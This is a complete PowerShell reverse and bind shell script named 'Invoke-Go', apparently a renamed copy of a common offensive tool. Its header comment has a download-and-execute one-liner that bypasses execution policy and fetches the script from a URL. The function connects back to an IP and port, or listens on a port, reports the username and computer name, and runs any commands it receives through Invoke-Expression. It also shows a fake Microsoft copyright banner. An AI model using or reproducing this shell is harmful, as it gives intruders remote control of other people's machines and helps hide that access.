# Invoke-Go: REV-PSH
# powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://<URL>/Invoke-Go.ps1');Invoke-Go -Back -IPAddress 192.168.216.129 -Port 443"
function Invoke-Go 
{ 
    [CmdletBinding(DefaultParameterSetName="back")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="back")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="onit")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="back")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="onit")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="back")]
        [Switch]
        $Back,

        [Parameter(ParameterSetName="onit")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the back switch is used.
        if ($Back)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2020 Microsoft Corporation. All rights not reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PSH ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PSH ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong!" 
        Write-Error $_
    }
}

# Invoke-Go -Back -IPAddress 192.168.216.129 -Port 443